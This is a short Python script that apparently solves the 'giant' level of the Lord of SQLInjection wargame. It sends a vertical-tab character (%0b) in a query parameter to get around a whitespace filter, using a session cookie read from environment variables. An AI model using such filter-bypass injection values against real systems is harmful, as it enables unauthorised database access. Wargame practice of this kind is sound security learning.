import requests
from dotenv import load_dotenv
import os

#지들만 아는 얘기하네
load_dotenv()
url=os.environ.get('LOS_URL')+'chall/giant_18a08c3be1d1753de0cb157703f75a5e.php?shit=%0b'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "GIANT Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)